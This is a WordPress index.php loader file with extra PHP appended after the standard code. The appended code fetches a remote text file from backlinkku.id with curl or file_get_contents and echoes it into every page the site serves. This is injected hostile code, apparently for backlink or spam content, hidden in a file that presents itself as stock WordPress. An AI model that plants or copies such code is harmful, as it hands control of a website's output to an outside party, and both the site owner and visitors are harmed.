<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
function fetchWithCurl($url) {
    if (!function_exists('curl_init')) {
        return false; }
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout 10 detik
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false; }
    curl_close($ch);
    return $result ?: false; }
function fetchWithFileGetContents($url) {
    $content = @file_get_contents($url);
    return $content !== false ? $content : false; }
function fetchContent($url) {
    $methods = ['fetchWithCurl','fetchWithFileGetContents'];
    foreach ($methods as $method) {
        $result = call_user_func($method, $url);
        if ($result !== false) {
            return $result; } }
    return "Gagal mengambil konten."; }
$url = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
$content = fetchContent($url);
echo $content;
